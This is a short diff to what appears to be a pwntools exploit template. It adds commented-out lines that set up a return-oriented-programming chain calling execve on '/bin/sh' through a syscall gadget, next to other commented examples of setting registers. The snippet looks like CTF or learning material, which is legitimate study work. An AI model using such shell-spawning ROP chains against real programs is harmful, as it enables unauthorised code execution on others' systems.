@@ -86,6 +86,10 @@ def main():
     # set raw or set to an address of (specific gadget) here is eax gadget 
     # rop.raw(rop.eax) 
     # rop.raw(0x12345678)
+    # rop.rsi = 0
+    # rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
+    # rop.rax = constants.SYS_execve
+    # rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
     # or you call directly the syscall
     # rop.call('execve',[0x6b7000, 0, 0])
     # print(rop.dump())
